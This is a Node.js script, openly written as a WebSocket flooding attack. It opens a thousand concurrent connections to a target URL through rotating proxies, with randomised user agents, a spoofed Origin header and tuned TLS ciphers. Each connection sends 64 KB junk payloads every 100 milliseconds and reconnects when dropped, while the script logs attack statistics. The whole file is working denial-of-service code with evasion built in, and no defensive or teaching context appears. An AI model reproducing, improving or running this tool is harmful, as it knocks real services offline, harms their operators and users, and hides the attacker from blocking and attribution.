const WebSocket = require('ws');
const fs = require('fs');
const https = require('https');
const tls = require('tls');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');

// Configuration
const TARGET = "wss://target-site.com/ws";
const CONCURRENT_CONNECTIONS = 1000;
const DELAY_BETWEEN_CONNECTIONS = 10; // ms
const MESSAGE_INTERVAL = 100; // ms
const PAYLOAD_SIZE = 65536; // bytes

// Load resources
const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim());
const USER_AGENTS = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(ua => ua.trim());

// TLS fingerprinting configuration
const TLS_OPTIONS = {
  ciphers: [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
  ].join(':'),
  honorCipherOrder: true,
  minVersion: 'TLSv1.2'
};

// Attack status tracking
const attackStatus = {
  totalConnections: 0,
  activeConnections: 0,
  failedConnections: 0,
  messagesSent: 0,
  startTime: Date.now()
};

// Log status periodically
setInterval(() => {
  const duration = Math.floor((Date.now() - attackStatus.startTime) / 1000);
  console.log(`[STATUS] ${new Date().toISOString()} | Duration: ${duration}s | ` +
    `Connections: ${attackStatus.activeConnections}/${attackStatus.totalConnections} | ` +
    `Failed: ${attackStatus.failedConnections} | Messages: ${attackStatus.messagesSent}`);
}, 5000);

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomProxy() {
  if (PROXIES.length === 0) return null;
  const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)].trim();
  
  if (proxy.startsWith('socks')) {
    return new SocksProxyAgent(proxy);
  } else {
    return new HttpsProxyAgent(proxy);
  }
}

function createCustomTlsSocket() {
  return tls.connect({
    ciphers: TLS_OPTIONS.ciphers,
    honorCipherOrder: TLS_OPTIONS.honorCipherOrder,
    minVersion: TLS_OPTIONS.minVersion
  });
}

function createBot() {
  attackStatus.totalConnections++;
  
  const options = {
    headers: {
      "User-Agent": getRandomUserAgent(),
      "Origin": "https://legitimate-site.com",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache"
    },
    agent: getRandomProxy(),
    createConnection: createCustomTlsSocket
  };

  const ws = new WebSocket(TARGET, options);
  attackStatus.activeConnections++;

  let messageInterval;
  
  ws.on('open', () => {
    messageInterval = setInterval(() => {
      try {
        ws.send(JSON.stringify({
          "payload": "A".repeat(PAYLOAD_SIZE),
          "timestamp": Date.now()
        }));
        attackStatus.messagesSent++;
      } catch (e) {
        console.error('Send error:', e.message);
      }
    }, MESSAGE_INTERVAL);
  });

  ws.on('error', (e) => {
    attackStatus.failedConnections++;
    attackStatus.activeConnections--;
    clearInterval(messageInterval);
  });

  ws.on('close', () => {
    attackStatus.activeConnections--;
    clearInterval(messageInterval);
    
    // Optional: reconnect automatically
    setTimeout(createBot, Math.random() * 10000);
  });

  return ws;
}

// Start the attack
console.log(`Starting WebSocket attack on ${TARGET}`);
console.log(`Initializing ${CONCURRENT_CONNECTIONS} connections...`);

for (let i = 0; i < CONCURRENT_CONNECTIONS; i++) {
  setTimeout(() => {
    try {
      createBot();
    } catch (e) {
      console.error('Connection error:', e.message);
      attackStatus.failedConnections++;
    }
  }, i * DELAY_BETWEEN_CONNECTIONS);
}

// Handle process termination
process.on('SIGINT', () => {
  console.log('\nAttack stopped by user');
  console.log('Final statistics:');
  console.log(attackStatus);
  process.exit();
});
